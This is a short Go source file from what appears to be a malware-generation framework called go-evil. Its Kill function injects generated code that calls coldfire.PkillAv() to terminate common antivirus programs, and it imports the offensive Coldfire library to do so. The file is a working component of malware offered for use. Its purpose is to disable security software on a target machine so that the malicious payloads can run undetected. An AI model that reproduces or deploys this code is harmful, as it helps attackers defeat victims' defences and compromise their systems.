package antivirus

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
	"github.com/TeamPhoneix/go-evil/utility/structure/json"
)

// Tries to terminate the most common antiviruses
func Kill(value string, data_object *json.Json_t) []string {
	function_call := "kill_antivirus"

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{""},

		Gut: []string{
			"err := coldfire.PkillAv()",
			"if err != nil{",
			"spine.log(err.Error())",
			"}",
		}})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", function_call)}
}
